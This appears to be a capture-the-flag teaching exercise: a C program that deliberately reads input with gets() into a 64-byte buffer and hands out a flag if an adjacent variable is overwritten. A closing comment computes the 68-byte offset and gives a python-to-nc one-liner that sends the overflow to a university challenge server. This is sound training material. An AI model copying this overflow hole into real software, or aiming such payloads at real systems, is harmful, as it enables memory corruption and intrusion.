#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include "../general.h"

int main() {
  init();
  int control;
  char buffer[64];

  printf("You win this game if you can change variable control\n");

  control = 0;
  gets(buffer);

  if(control != 0) {
      printf("YOU WIN!\n");
      printf("Take my secrets: %s\n", getflag());
  } else {
      printf("Try again...\n");
  }
}


/* 

   Basically we just need to write over the variable control. For that we just need to know the adress of the buffer and the 
   adress of the variable control . So the first is 0xbfffef8c and the second is 0xbfffefcc. Then we need to write:

				0xbfffefcc-0xbfffef8c + 0x04 = 64 + 4 = 68 bytes			

   python -c 'print "A"*68 ' | nc mustard.stt.rnl.tecnico.ulisboa.pt 9990

*/



